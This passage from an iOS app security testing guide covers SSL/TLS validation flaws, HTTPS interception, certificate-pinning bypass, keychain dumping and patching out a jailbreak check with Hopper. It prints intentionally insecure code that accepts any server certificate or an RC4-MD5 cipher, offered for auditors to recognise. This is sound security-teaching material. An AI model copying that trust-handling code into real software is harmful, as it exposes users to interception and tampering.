greatest control over the transport and is relatively complex to\nimplement. For this reason, developers rarely use it directly, preferring the abstracted approach offered by\nCFNetwork and the URL loading system.\nRegardless of the API that your application is using, an SSL or TLS connection can be weakened in number of\nways, and as a security professional or a developer, you should be aware of them. We will now walk through\nsome of the common implementation flaws that can occur when using these APIs to make SSL/TLS\nconnections.\nCertificate Validation\nSSL and TLS are built on the fundamental concept of certificate-based authentication; this ensures that you are\ncommunicating with the server you intended to, and it also prevents eavesdropping and tampering attacks. Any\nweakening in the validation of the certificate chain can have serious consequences for an application and may\nleave user data exposed and vulnerable to eavesdropping and modification.\nAssuming certificate pinning is not in use, perhaps the most dangerous thing an application can do when setting\nup an SSL session is to accept a certificate that is not signed by a trusted certificate authority (CA). The\nlegitimacy of a self-signed certificate cannot be guaranteed because it has not undergone the verification process\nthat is performed by the certificate authority. An application accepting a self-signed certificate is therefore\nunable to verify that the server presenting the certificate is indeed the server it purports to be, which leaves the\napp susceptible to eavesdropping and tampering from any adversary who is suitably positioned in the network.\nAs a security professional conducting an audit of an iOS application, verifying whether the app permits self-\nsigned certificates is something that should be in your methodology. A number of ways exist for an application\nto permit self-signed certificates depending on which API it is using; some common ways are detailed here.\nWhen you’re using the NSURLConnection class, self-signed certificates can be permitted within the\ndidReceiveAuthenticationChallenge delegate method in a way similar to the following:\n- (void)connection:(NSURLConnection *)connection \\\ndidReceiveAuthenticationChallenge: \\\n(NSURLAuthenticationChallenge *)challenge\n{\nif ([challenge.protectionSpace.authenticationMethod\nisEqualToString:NSURLAuthenticationMethodServerTrust])\n{\n[challenge.sender useCredential:[NSURLCredential\ncredentialForTrust:challenge.protectionSpace.serverTrust]\nforAuthenticationChallenge:challenge];\n[challenge.sender\ncontinueWithoutCredentialForAuthenticationChallenge:challenge];\nreturn;\n}\n}\nThe NSURLSession class is the preferred way to implement HTTPS using URL loading in applications using the\niOS 7 SDK or higher. In such cases, during a code review, you might find that self-signed certificates are\npermitted, using code similar to the following:\n- (void)URLSession:(NSURLSession *)session\ndidReceiveChallenge:(NSURLAuthenticationChallenge *)challenge\ncompletionHandler:(void (^)(NSURLSessionAuthChallengeDisposition,\nNSURLCredential *))completionHandler\n{\nif([challenge.protectionSpace.authenticationMethod\nisEqualToString:NSURLAuthenticationMethodServerTrust])\n{\nNSURLCredential *credential = [NSURLCredential\ncredentialForTrust:challenge.protectionSpace.serverTrust];\ncompletionHandler(NSURLSessionAuthChallengeUseCredential,\ncredential);\n}\n}\nAn application that permits self-signed certificates using the Carbon framework, however, might set up an SSL\nsettings dictionary with the kCFStreamSSLValidatesCertificateChain constant set to false in a similar way to\nthe following code:\nNSDictionary *sslSettings = [NSDictionary dictionaryWithObjectsAndKeys:\n(id)kCFBooleanFalse, (id)kCFStreamSSLValidatesCertificateChain, nil];\nCFReadStreamSetProperty(readStream, kCFStreamPropertySSLSettings,\nsslSettings);\nWhen an application is using the Secure Transport API, you may find that the\nkSSLSessionOptionBreakOnServerAuth option is set on the SSL session. This disables the API’s built-in\ncertificate validation but does not necessarily mean that the application does not implement its own custom\ntrust evaluation routines, and therefore you should further explore the code to check for implantation of chain\nvalidation code. Here is an example of how you may set this option on an SSL session:\nSSLSetSessionOption(ssl_ctx->st_ctxr,\nkSSLSessionOptionBreakOnServerAuth, true)\nIn addition to permitting self-signed certificates, a developer might undermine the trust evaluation process in\nother ways. These include but are not limited to the following possible example oversights:\nAllowing expired certificates\nAllowing valid certificates but with mismatching hostnames\nAllowing expired root certificates (ones that belong to the CA)\nAllowing any root certificate\nWithin the CFNetwork API a set of constants can be set within the kCFStreamPropertySSLSettings dictionary in a\nway similar to that used in the previous example. Such settings are capable of weakening the SSL session in\ndifferent ways. You should, however, be aware that although present in later SDKs their use was deprecated in\niOS 4.0. These constants are\nkCFStreamSSLAllowsAnyRoot\nkCFStreamSSLAllowsExpiredRoots\nkCFStreamSSLAllowsExpiredCertificates\nIf a developer needs to weaken certificate validation (for example, during development) using CFNetwork or the\nSecure Transport API, Apple recommends implementing a custom certificate validation routine using the Trust\nServices API. To undermine the certificate validation using a custom routine, you may find the application\npassing one of the following constants to the SecTrustSetOptions method:\nkSecTrustOptionAllowExpired—Allows expired certificates (except for the root certificate)\nkSecTrustOptionAllowExpiredRoot—Allows expired root certificates\nkSecTrustOptionImplicitAnchors—Treats properly self-signed certificates as anchors (an authoritative entity\nfrom which trust is assumed not derived) implicitly\nSo far within this section issues that can affect the certificate validation process have had access to the\napplication’s source code. It is, however, likely that during some security reviews you will not have access to an\napplication’s source code and therefore you must perform static and dynamic analysis to identify issues relating\nto SSL/TLS certificate validation.\nDynamic testing enables you to determine whether an application allows self-signed certificates with a high\ndegree of accuracy. In short, this involves configuring the device to use a proxy that presents a self-signed\ncertificate and monitoring to see whether the application functions as expected and whether the HTTPS traffic\npasses through the proxy. This process has been dissected into the following steps:\n1. Ensure that the device does not have your proxy certificate saved in its trust store by going to the profile\nsettings (Settings General Profile), which will not exist if a profile is not configured.\n2. After ensuring your local firewall is disabled, start a proxy on your workstation and configure it to listen on\nthe external network interface, as shown in Figure 3.1; we use Burp Suite proxy as an example.\n3. Configure your device to use a proxy (General WiFi. Select your wireless network and then choose HTTP\nProxy Manual) and set the IP address and port of your proxy to be those of your workstation, as per Figure\n3.2.\n4. Launch the application in question and attempt to use it as normal, monitoring your proxy to see whether it\nintercepts HTTPS traffic.\nFigure 3.1 Configuring Burp Suite to listen on all interfaces\nFigure 3.2 Configuring your device to use a proxy\nIf your proxy intercepts HTTPS traffic without the proxy’s SSL certificate being installed on the device then it is\nsafe to say that the application accepts self-signed certificates and is vulnerable to eavesdropping from man-in-\nthe-middle attacks. This same process can also be used to intercept cleartext HTTP traffic as discussed earlier in\nthis chapter.\nCVE-2014-1266: SSL/TLS “GOTO FAIL”\nDevices running versions of iOS 7 prior to 7.0.6 and iOS 6 prior to 6.1.6 are vulnerable to a critical issue in\nthe certificate validation routine of the Secure Transport API. This issue leaves these devices and\napplications on them susceptible to eavesdropping and tampering attacks by an attacker who is suitably\npositioned in the network.\nThe Apple security bulletin provides additional details on this issue (http://\nsupport.apple.com/kb/HT6147), and you can find an in-depth explanation of the issue in the Imperial\nViolet blog (https://www.imperialviolet.org/ 2014/02/22/applebug.html).\nTo test for this issue you can browse to https://gotofail.com/ from either within MobileSafari, or from\nwithin any UIWebView of a third-party application that allows arbitrary URLs to be loaded.\nSSL Session Security\nThe Apple APIs permit a number of ways in which the security of an SSL session can be undermined other than\ncertificate validation. If your application is using the high-level URL loading APIs, you should not be concerned\nbecause these APIs are not sufficiently granular to allow the modification of the properties of an SSL/TLS\nsession. If, however, the application in question is using the Carbon framework or the Secure Transport API\nthen you should be aware of several things, described next.\nProtocol Versions\nBoth the CFNetwork and Secure Transport APIs allow a developer to modify the protocol version that the client\nshould use in the SSL or TLS session. As a security professional you should be aware that certain versions of the\nSSL protocol have known weaknesses and their use is discouraged. Specifically, SSLv2 and SSLv3 are susceptible\nto a number of different attacks that may allow a suitably positioned attacker to obtain the plaintext from a\nciphertext that was encrypted with these protocols.\nWhen using the CFNetwork API, a developer can configure the protocol version through the\nkCFStreamPropertySSLSettings dictionary. The specific property that sets the protocol version to use for the\nsecure channel is kCFStreamSSLLevel, which may be set to one of the following constants:\nkCFStreamSocketSecurityLevelNone—This property specifies that no security level be set. You should avoid\nusing this option, because it allows negotiation of sessions using any SSL/TLS version, including the ones\nthat are known to be flawed.\nkCFStreamSocketSecurityLevelSSLv2—This property specifies that the socket should use SSLv2; avoid using\nthis property.\nkCFStreamSocketSecurityLevelSSLv3—This property specifies that the socket should use SSLv3; avoid using\nthis property.\nkCFStreamSocketSecurityLevelTLSv1—This property forces the socket to use TLSv1 and is the preferred\nconfiguration setting for the socket.\nkCFStreamSocketSecurityLevelNegotiatedSSL—This property forces the application to use the highest level\nof security that can be negotiated; you should avoid it due to the potential use of insecure protocol versions.\nSimilarly, when you’re using the Secure Transport API, it is possible to configure the protocol version to use\nwith the SSLSetProtocolVersion()or SSLSetProtocolVersionEnabled()functions, which accept one of the\nfollowing constants for the SSL protocol:\nkSSLProtocolUnknown—This configuration specifies that the application should not perform a protocol\nnegotiation and the default specification should be used. Avoid the use of this constant.\nkSSLProtocol3—This configuration specifies that SSLv3 is the preferred protocol although if it is not\navailable then the application should attempt to use SSLv2. Avoid the use of this constant.\nkTLSProtocol1—This configuration specifies that TLSv1.0 should be used by the application but lower\nversions may be negotiated. Avoid the use of this constant.\nkTLSProtocol11—This configuration specifies that TLSv1.1 should be preferred by the application but lower\nversions may be negotiated. Avoid the use of this constant.\nkTLSProtocol12—This configuration specifies that TLSv1.2 is preferred by the application but lower versions\nmay be negotiated. This is the preferred configuration.\nkDTLSProtocol1—This configuration specifies that DTLSv1.0 is preferred by the application. Avoid the use of\nthis constant.\nCipher Suite Negotiation\nThe cipher suite is the combination of authentication, encryption, message authentication code (MAC), and key\nexchange algorithms that are used to negotiate a secure network connection using SSL/TLS. A wide range of\ncipher suites with differing levels of security are available.\nThe choice of cipher suites affects iOS applications; both the Secure Transport and CFNetwork APIs allow a\ndeveloper to explicitly configure the cipher suite to use for an SSL/TLS session. This means that through a lack\nof awareness, a developer can configure an application to use a cipher suite that is not cryptographically secure.\nThe full list of available cipher suites is extensive; the suites supported by CFNetwork and the Secure Transport\nAPI all have entries in the SSLCipherSuite enum, which is documented by Apple at the following URL:\nhttps://developer.apple.com/library/ios/documentation/security/Reference/\nsecureTransportRef/index.html#//apple_ref/c/tdef/SSLCipherSuite. For details on ciphers that are\nconsidered to be strong you should again refer to the documentation from OWASP\n(https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet#Rule_-\n_Only_Support_Strong_Cryptographic_Ciphers).\nTo configure an SSL/TLS session that supports only a single cipher suite, you might find an application with\ncode similar to the following:\nSSLCipherSuite *ciphers = (SSLCipherSuite *)malloc(1 * \\\nsizeof(SSLCipherSuite));\nciphers[0] = SSL_RSA_WITH_RC4_128_MD5;\nSSLSetEnabledCiphers(sslContext, ciphers, 1);\nIn this example, the application supports only the SSL_RSA_WITH_RC4_128_MD5 cipher suite, which has known\nweaknesses associated with its use.\nWithout the source code for an application, determining the cipher suites being negotiated is still possible using\nthe standard methodology that would apply to any SSL/TLS-enabled client. Using Wireshark or an equivalent\npacket capture tool you can capture and dissect the client “hello” packet to reveal the list of negotiable ciphers,\nas shown in Figure 3.3.\nFigure 3.3 Capturing cipher suites using Wireshark\nIntercepting Encrypted Communications\nIn the previous section you learned about the types of vulnerabilities that can affect the security of an SSL/TLS\nsession. However, sometimes the security of the SSL/TLS session has not been undermined and you need to\nintercept encrypted communications. For example, if an application communicates with a web service over\nHTTPS you may want to intercept the communications to comprehensively assess the security of the web\nservice. In this scenario you may configure your mobile device to use a proxy as has been detailed in the\nprevious section, but you see no HTTPS traffic because the application rejects the certificate presented by your\nproxy; the certificate is likely self-signed and therefore untrusted by the device. Fear not; assuming the\napplication is not using certificate pinning, intercepting encrypted traffic is still possible by installing your\nproxy’s certificate into your device’s certificate store.\nTo install a certificate on your device, using Burp Suite as the intercepting proxy app, perform the following\nsteps:\n1. After ensuring your local firewall is disabled, start a proxy on your workstation and have it listen on the\nexternal network interface, as shown in Figure 3.1, which uses the Burp Suite proxy as an example.\n2. Configure your device to use a proxy (General WiFi. Select your wireless network and choose HTTP Proxy\nManual) and set the IP address and port of your proxy to be those of your workstation as per Figure 3.2.\n3. In MobileSafari browse to http://burp and select the CA Certificate option as shown in Figure 3.4.\n4. The Install Profile window should load, presenting the PortSwigger CA certificate as shown Figure 3.5. Click\nthe Install button and then select Install Now to trust this CA.\nFigure 3.4 Installing the Burp certificate on your device\nFigure 3.5 Install profile view\nIf this process is successful it will cause the PortSwigger CA profile to be installed on your device and be marked\nas trusted. At this stage you should be able to intercept any HTTPS communications via your Burp Suite proxy.\nDANGERS OF INSTALLING PROFILES\nYou should be aware that making a profile such as the PortSwigger CA trusted means that any host that\npresents a certificate signed by this CA is potentially able to perform man-in-the-middle communications\nto and from your device.\nWhen you have finished testing, you should remove the profile from your device (Settings General\nProfiles) if you plan to use the device on a day-to-day basis or on untrusted networks.\nBypassing Certificate Pinning\nIf you followed the steps described in the previous section “Intercepting Encrypted Communications” and you\nfind that you’re still unable to intercept HTTPS traffic, there is a very good chance that the application in\nquestion is using certificate pinning. Certificate pinning is when an application disregards the public certificate\nhierarchy and explicitly associates, or “pins,” an x509 or public key to a particular host. This process involves\nembedding the expected public key or x509 certificate within the application and validating it against the\ncertificate presented by the server to see whether they match.\nIf someone is trying to intercept the traffic communicated in this encrypted channel, this can obviously pose a\nproblem, because even if you mark your proxy’s certificate as trusted on the device, it would still be refused by\nthe application’s certificate pinning code. If you are using a non-jailbroken device then unfortunately you will\nnot be able to progress any further and inspect the encrypted traffic. If you are using a jailbroken device,\nhowever, overriding the APIs used to perform trust evaluation on certificates is possible by setting the\nkSSLSessionOptionBreakOnServerAuth option whenever the SSLSetSessionOption() function is called by the OS.\nYou can implement such an attack using a substrate tweak to effectively disable certificate validation across the\ndevice in a similar way to the one described at an application layer earlier in this chapter in the “Certificate\nValidation” section. A blog post by Alban Diquet describes this process (https://nabla-\nc0d3.github.io/blog/2013/08/20/ios-ssl-kill-switch-v0-dot-5-released/).\nAt least two implementations of substrate tweaks exist that you can use to bypass certificate pinning when using\na jailbroken device:\niOS SSL Kill Switch (https://github.com/iSECPartners/ios- ssl-kill-switch)\niOS TrustMe (https://github.com/intrepidusgroup/trustme)\nFor details on how to use and install these tweaks consult the preceding links.\nDANGERS OF INSTALLING TRUST BYPASS TOOLS\nBy installing either iOS SSL Kill Switch or iOS TrustMe, you are effectively disabling certificate validation\non your device. If you use this device for personal or corporate data you are potentially allowing an\nattacker to man-in-the-middle any SSL/TLS or HTTPS connection your device makes.\nIdentifying Insecure Storage\nA key concept in mobile application security is that data should not be persistently stored to the device unless it\nis absolutely necessary. Due to the nature of mobile phones, devices are frequently lost or stolen and it’s\nconceivable that your device may find itself in the hands of an adversary who wants to extract data for malicious\npurposes. Some mitigation is in place when a user has a complex passcode on his device but it is not\ninconceivable to think that a device could be stolen while unlocked or depending on the sophistication of your\nadversary, the Touch ID sensor bypassed (http://www.ccc.de/en/updates/2013/ccc-breaks- apple-touchid).\nThe attack surface for content stored on the device does not end there, but in fact extends to remote\ncompromise through exploitation, default credentials on jailbroken devices, devices not having a passcode,\nphysical attacks such as pairing with malicious devices (http://2013.hackitoergosum.org/presentations/Day3-\n04.Hacking%20apple%20accessories%20to%20pown%20iDevices%20%E2%80%93%20Wake%20up%20Neo!%20Your%20phone%20got%20pwnd%20!%20by%20Mathieu%20GoToHack%20RENARD.pdf\nor exploitation of elements within the secure boot chain. With these considerations in mind you should assume\nthat any data stored to the device could potentially be compromised. In many cases, an application may actually\nneed to persistently store content and data to the device, and in these circumstances developers should take\nappropriate measures to protect that content.\nGenerally you should look for four things when searching for content that is insecurely stored by an application,\nalthough more than one can apply to individual files:\nSensitive content directly stored by the application in plaintext\nSensitive content directly stored by the application that is encrypted using a custom encryption\nimplementation but using an insecure encryption key or in an otherwise easily reversible format\nSensitive content directly stored by the application but not in a suitable data protection class\nSensitive content inadvertently stored by the application by virtue of iOS\nThis section focuses on the third possibility and describes how to identify the data protection classes that are\napplied to individual files or keychain items on your device. Chapter 4 covers the fourth possibility and the first\ntwo possibilities are application specific and are broadly covered within other areas of this book. In Chapter 2\nyou learned how iOS applications could take advantage of the Data Protection API to protect individual files or\nkeychain items on the device. If you did not read this chapter it is recommended that you go back and review\n“Understanding the Data Protection API,” because it provides the fundamental background knowledge for this\nsection.\nAlthough the Data Protection API is an extremely useful method of securing content on iOS and the default\nprotection class affords a reasonable level of assurance, be aware that the protection classes can be applied on\nper-file or per-keychain-item basis. With this in mind, your methodology should include a review of every file or\nkeychain item stored by an application. Content stored using protection class D (NSFileProtectionNone or\nkSecAttrAccessibleAlways) is of particular concern and is not suitable to protect sensitive data at rest. The use\nof protection class C (NSFileProtectionCompleteUntilFirstUserAuthentication or\nkSecAttrAccessibleAfterFirstUnlock and default since iOS 7) is also discouraged for particularly sensitive data.\nTo determine the protection class applied to individual files or keychain items, you need to use a mixture of\nstatic and dynamic techniques.\nIdentifying the protection classes used by individual files without dynamic analysis can be somewhat\nproblematic; however, provided that the file is stored in a location that is backed up, you should be able to\ndetermine the protection class using an iTunes backup file and the ios-dataprotection tool\n(https://github.com/ciso/ios-dataprotection). To do this you should first back up your device by connecting\nit to your workstation, running iTunes, and selecting the Back Up Now option for your device. After your device\nhas been backed up you will be able to parse the backup files using ios-dataprotection. Here is a simple\nexample:\n$ java -jar build/ios-dataprotection.jar\n(c) Stromberger 2012, IAIK Graz University of Technology\n[1] MDSecPhone (22.10.2014 16:44)\n[2] user?s iPad (04.08.2014 01:41)\nChoose a backup: 1\nOkay, we will store it to /Users/user/Desktop/analysis.csv\nExtracting and decrypting your backup\nCreating output file in csv format\n5357/5357 Files extracted\nFinished\nAfter the backup has been parsed, ios-dataprotection creates an analysis .csv file on the desktop, which\ncontains a listing of files within the backup and the associated protection class for each file:\n$ grep mdsec ~/Desktop/analysis.csv\ncom.mdsec.lab1-1a,1,NSFileProtectionComplete,Library/Preferences/\ncom.mdsec.lab1-1a.plist,101\nThe limitation of using this technique is that it is restricted only to files that can be backed up; protection\nclasses on files stored in other locations, such as the tmp directory, cannot be assessed in this way. You will\ndiscover how you can find the protection class used for these files using dynamic analysis later in this section.\nAlso be aware that the Data Protection API can not only be used to protect individual files, but also to protect\nkeychain items.\nDetermining the protection class applied to individual keychain items is possible using the keychain_dump\n(https://code.google.com/p/iphone-dataprotection/downloads/detail?name=keychain_dump) tool that was\nreferenced in Chapter 2. To retrieve all the keychain items on your device run keychain_dump as root with the\ndevice unlocked (that is, after entering the PIN or passcode). Having the device unlocked allows you to access\nkeychain items in class A (kSecAttrAccessibleWhenUnlocked) that would otherwise be inaccessible if the screen\nlock was active. Here is a sample output of running keychain_dump:\nMDSecPhone:~ root# ./keychain_dump\nWriting 26 passwords to genp.plist\nWriting 14 internet passwords to inet.plist\nWriting 5 certificates to cert.plist\nWriting 15 keys to keys.plist\nMDSecPhone:~ root#\nYou will find that keychain_dump has created a number of plist files in your current working directory. These\nplist files represent the content extracted from the device’s keychain as name-value pairs and contain\ninformation about the protection class that the keychain item is stored using; for example:\n<dict>\n<key>acct</key>\n<string>mdsecadmin</string>\n<key>agrp</key>\n<string>com.mdsec.lab1-1d</string>\n<key>cdat</key>\n<date>2014-09-09T10:55:08Z</date>\n<key>data</key>\n<string>letmein</string>\n<key>desc</key>\n<string></string>\n<key>gena</key>\n<string>lab1.1d</string>\n<key>labl</key>\n<string></string>\n<key>mdat</key>\n<date>2014-09-09T10:55:08Z</date>\n<key>pdmn</key>\n<string>ak</string>\n<key>protection_class</key>\n<string>WhenUnlocked</string>\n<key>rowid</key>\n<integer>26</integer>\n<key>svce</key>\n<string></string>\n<key>sync</key>\n<integer>0</integer>\n<key>tomb</key>\n<integer>0</integer>\n<key>v_Data</key>\n<data>\nbGV0bWVpbg==\n</data>\n</dict>\nThe protection_class key stores the value for the protection class applied to the keychain item. In this case, it\nis class A (kSecAttrAccessibleWhenUnlocked).\nUp to now you will have a good understanding of how to obtain the protection class applied to all keychain items\nand files that are stored in iTunes backups. This does not, however, account for all eventualities, because files\nthat do not get backed up may not be properly assessed. Performing dynamic analysis, examining the class that\nis applied to files as they are created, is therefore important. The simplest way to perform dynamic analysis on\nan application is to instrument it using a runtime manipulation framework such as Cydia Substrate.\nInstrumentation of the iOS runtime is covered later in this chapter; however, for the moment be aware that you\ndo not need to implement this yourself. Indeed, a multipurpose tool named Snoop-it\n(https://code.google.com/p/snoop-it/) that instruments the iOS runtime for the purpose of inspecting the\nAPIs used for keychain and filesystem access has already been implemented and can be used to retrieve the data\nprotection class applied when an artifact is created. Figure 3.6 shows Snoop-it being used to monitor filesystem\naccess in an application.\nFigure 3.6 Snoop-it filesystem monitoring\nPatching iOS Applications with Hopper\nThe subject of software “cracking” is not a new one and was well documented long before iOS applications even\nexisted. Cracking often has practical uses when you’re conducting a security assessment of iOS applications. In\nChapter 2 you learned that iOS applications are compiled to native code for the ARM architecture, and it should\ncome as no surprise that by modifying the compiled executable code it is possible to directly manipulate the\nbehavior of the application. This chapter does not cover the subject in great depth because it is beyond the scope\nof this book. Instead, we offer a very brief introduction and walk-through of the processes that a tester would\nneed to go through to “patch” an iOS application. Although not essential, a basic understanding of ARM\nassembler will certainly aid in your learning. If you are not familiar with ARM or assembler in general, review\nthe “Introduction to ARM” training course that is freely available at\nhttp://opensecuritytraining.info/IntroARM.html.\nTo demonstrate how to modify the behavior of an iOS application by patching the compiled executable, this\nsection details a step-by-step analysis of how to defeat a jailbreak detection check within a sample application\nand with a jailbroken device. You should be aware that this process only applies to applications running on\njailbroken devices, because modifying an application will invalidate its code signature. The steps outlined in this\nprocess are described next.\nWhen the sample application is run, a jailbreak detection check is performed and a UIAlertView is shown (see\nFigure 3.7) if the device is found to be jailbroken (closing the UIAlertView causes the application to exit).\nAlthough this example may seem contrived, it mimics the checks and behavior typical of many simple jailbreak\ndetection routines. The objective of this walk-through is to bypass this check and allow the application to run.\nFigure 3.7 Jailbreak check in sample application\nThe first step in reverse engineering and patching an iOS application is to obtain the compiled binary. You can\ndo this by copying the binary off your device, or if you downloaded it using iTunes, by unzipping the IPA and\nusing the binary contained in the Payload/Application.app folder. If your application is an App Store\napplication, you will need to remove Apple’s DRM encryption, as detailed in Chapter 2.\nAfter locating the binary, identify the architectures that it contains and if necessary “thin” the binary to the\narchitecture that best matches your device. Chapter 2 covers this process and the architectures supported by\neach device were detailed in the “Reverse Engineering iOS Binaries” section of the same chapter. In this\ninstance, however, the application is not a fat binary and contains only an armv7 slice:\n$ lipo -info Lab3.4a\nNon-fat file: Lab3.4a is architecture: armv7\nPerhaps the greatest weapon in a reverse engineer’s arsenal is the disassembler, which can be used to translate\nthe compiled machine code into assembler. To reverse engineer an application you can use any disassembler;\nhowever, this demonstration makes use of the professional version of the Hopper disassembler\n(http://www.hopperapp.com/). Be aware that much of the functionality detailed in this walk-through is available\nin the demo version of this software, with the exception of the “Produce New Executable” menu item that is\nused to create a new binary with the relevant patches applied. You can use the following steps to patch the\nsample application and defeat the jailbreak detection routine.\n1. Load the binary into Hopper using the File Read Executable to Disassemble menu item and browsing to the\nlocation of the compiled application. This causes Hopper to disassemble the application and provides a view,\nas shown in Figure 3.8.\n2. Locate the jailbreak functionality within the compiled binary. Referring to Figure 3.7, you can see that the\nUIAlertView displays the string “This device is jailbroken; please remove the jailbreak and try again.”\nWorking backwards from where this string is used may be a good methodology for identifying the jailbreak\ndetection. To locate a string resource in Hopper, click the Strings button. You can also use the search\nfunction to find the strings quickly, as shown in Figure 3.9.\n3. In this case the string is located in the __cstring segment of the binary. To locate where a string is used in\nHopper you can use the Is Referenced By option from the right-hand navigation window as shown in Figure\n3.10.\n4. Double-click on the cross-reference to move to where the string is referenced. In iOS applications NSString\nobjects are represented as CFString constants and will be located in the __cfstring segment. Following the\ncross-reference to the CFString constant leads to where the string is used in the application; in this case, in\nthe [ViewController viewDidLoad] method, as shown in Figure 3.11.\n5. If you study Figure 3.11 carefully, you will see that a UIAlertView object is only created based on the return\nvalue from the sub_b1fc function at 0xb08a. If the return value is equal to zero, the cbz r0, 0xb0fc\ninstruction causes the execution flow to jump to address 0xb0fc. You can get a clearer view of what a\nfunction is doing through the pseudo-code view in Hopper, so choose Window Show Pseudo Code of\nProcedure. Figure 3.12 shows the pseudo-code output.\n6. Because the application exits only when the UIAlertView button is clicked, you can see what actions are\ntriggered from the button click by inspecting the clickedButtonAtIndex delegate of this alert view. Figure\n3.13 shows the pseudo-code view for this function, which was found to be compiled next to the viewDidLoad\ndelegate. From the pseudo-code it should be clear that clicking the button causes the application to call the\nexit()function.\n7. Clearly, the application loads the UIAlertView based on the return value of the sub_b1fc function. To jump to\nthe disassembly view of a function in Hopper, double-click the name of the function. In this case you should\nnow understand that the UIAlertView is only loaded when the function returns anything other than zero.\nTherefore it stands to reason that by permanently modifying the return value of the sub_b1fc function you\ncan prevent the UIAlertView from ever being displayed. To get a better understanding of the function and\nidentify potential instructions to modify, use the pseudo-code view again, as shown in Figure 3.14.\n8. The function returns the value in the r0 register, which is set in the two highlighted locations in the\nfunction. One instance sets the r0 register to 0x0 whereas the other sets it to 0x1. With this in mind,\nmodifying the 0x1 constant in the loc_b226 basic block to 0x0 should cause the function to always return 0x0.\nTherefore, with a simple 1-byte patch bypassing the jailbreak detection should be possible. To apply a patch\nin Hopper, locate the instruction you want to modify, in this case the movs r0, 0x1 located at 0xb226, and\npress the Alt+A keyboard shortcut. This loads the Hopper assembler window, as shown in Figure 3.15. In this\nwindow you can modify the instruction, which in this case, simply modify it to movs r0, 0x0.\n9. Modifying an instruction causes Hopper to no longer recognize it as a procedure; to mark a block of code\nback to a procedure you can navigate to the start of the function and press P on your keyboard. When you’ve\nmade a binary patch you may want to double-check your modifications in the pseudo-code viewer to make\nsure it looks as expected. When you are happy with the changes that you have made, save them to a new\nexecutable by selecting File Produce New Executable.\n10. As detailed in Chapter 2, iOS applications are code signed; by modifying an application in the manner\npreviously described you will have invalidated the code signature. However, to run a modified application on\na jailbroken device, you can either pseudo-sign it or code-sign it using a self-signed certificate. To pseudo-\nsign an application you can use the ldid tool created by saurik as described in Chapter 2 in the section,\n“Tools for Signing Binaries.” To sign this example binary, execute ldid as follows:\n$ l did -S Lab3.4a-patched\n11. To test your patches upload the application to your device and overwrite the existing binary for the\napplication. Opening the modified example application on a jailbroken device no longer causes the\nUIAlertView to display, indicating that the jailbreak detection has been successfully bypassed as shown in\nFigure 3.16.\nFigure 3.8 Hopper disassembler\nFigure 3.9 Locating strings in Hopper\nFigure 3.10 Finding references to strings in Hopper\nFigure 3.11 Disassembly of the viewDidLoad delegate\nFigure 3.12 Pseudo-code view in Hopper\nFigure 3.13 Pseudo-code view of clickedButtonAtIndex in Hopper\nFigure 3.14 Pseudo-code view of sub_b1fc function in Hopper\nFigure 3.15 Modifying an instruction in Hopper\nFigure 3.16 Running the example application after bypassing the jailbreak detection\nFrom this section you should’ve gained an understanding of how iOS applications can be statically patched to\nmodify application behavior and bypass security controls. Although we’ve only demonstrated a simple example,\nyou can apply the overall methodology to more complex applications, and for many different patching purposes.\nAttacking the iOS Runtime\nIn the previous section you learned how to statically patch applications so as to modify their behavior, and how\nto leverage this to bypass security controls. However, this is not the only way in which iOS applications can be\nmanipulated; you can also instrument the runtime to have a similar effect.\nHaving an appreciation of the application runtimes is important for understanding how iOS applications\nfunction. Objective-C and Swift defer as many decisions as possible from compile and link time to runtime. At\nthe heart of this concept is reflection, which allows applications to be aware of and modify their own behavior at\nruntime. Reflection allows apps to do things such as dynamically load new classes, change method\nimplementations and generally avoid many of the constraints that are implied through the use of native code.\nHaving such abilities at runtime means that you are also able to manipulate the runtime and an app’s behavior\nto your own ends, which can be an extremely powerful resource for a security professional. This section explores\nthe different ways in which the iOS runtime can be manipulated, providing practical examples where\nappropriate.\nUnderstanding Objective-C and Swift\nBefore delving into how to programmatically manipulate the Objective-C and Swift runtimes, having a basic\nunderstanding of how these languages work, and if you are unfamiliar with either of the languages, seeing what\na simple program might look like, can be helpful.\nAlthough this section provides a basic breakdown of the essential components of each of these languages, if you\nhave never seen any Objective-C or Swift code before, we recommended that you familiarize yourself with these\nlanguages; the documentation provided by the Apple developer program is a useful starting point. These links\nare likely to be helpful:\nhttps://developer.apple.com/library/ios/documentation/Swift/Conceptual/Swift_Programming_Language/\nand\nhttps://developer.apple.com/library/mac/documentation/cocoa/conceptual/ProgrammingWithObjectiveC/Introduction/Introduction.html\nObjective-C and Swift are object-oriented programming languages. This means that they use objects to\nencapsulate data in the form of classes. A class can contain instance variables, methods, and properties. Within\na class, member variables can be considered similar to private variables in Java and due to access control require\ngetter and setter methods to access them. For more information on access control within Swift and Objective-C,\nconsult the Apple documentation\n(https://developer.apple.com/library/ios/documentation/Swift/Conceptual/Swift_Programming_Language/AccessControl.html\nand\nhttps://developer.apple.com/library/mac/documentation/Cocoa/Conceptual/ProgrammingWithObjectiveC/EncapsulatingData/EncapsulatingData.html\nWithin an Objective-C class, the definition of the class structure is described within an interface file. Figure 3.17\nprovides a simple breakdown of an interface.\nFigure 3.17 A breakdown of an Objective-C interface\nFigure 3.17 contains an example of both instance and class methods; these are denoted by the – and + symbols,\nrespectively. To invoke an instance method you require an instance of the class to be instantiated, whereas class\nmethods are very similar to static methods in other programming languages and can be invoked without\nactually creating an instance of the class.\nHere is an example of creating an instance of the hypothetical HelloWorld class (as an object) and then invoking\nthe instance method sayPhrase:\nHelloWorld *hw = [[HelloWorld alloc] init];\n[hw setPhrase:@\"Hello World\"];\n[hw sayPhrase];\nTo invoke the class method sayPhrase you would not need to allocate a new object, as shown here:\n[HelloWorld sayPhrase:@\"Hello World\"];\nThis distinction is important, as you will need to understand how to invoke both instance and class methods\nwhen you start to instrument the iOS runtime.\nFigure 3.18 details an equivalent breakdown of a Swift class.\nFigure 3.18 A breakdown of Swift class\nIn a similar way to the Objective-C example, the class must be instantiated before the instance method can be\ninvoked, as follows:\nlet hw = HelloWorld()\nhw.phrase = \"Hello world\"\nhw.sayPhrase()\nWhereas to invoke the class method sayPhrase, you would not need to allocate a new object because it can be\ncalled statically:\nHelloWorld.sayPhrase(\"Hello world\")\nAlso note that in Swift, you can use access modifiers such as public and private to enforce access control in a\nsimilar way to other object-oriented programming languages.\nInstrumenting the iOS Runtime\nIn the previous section you learned some of the basic building blocks of Objective-C and Swift, which are\nimportant to begin instrumenting the iOS runtime. This section details the various approaches you can use to\ninstrument the runtime, specifically through method swizzling, function hooking, and using the preload 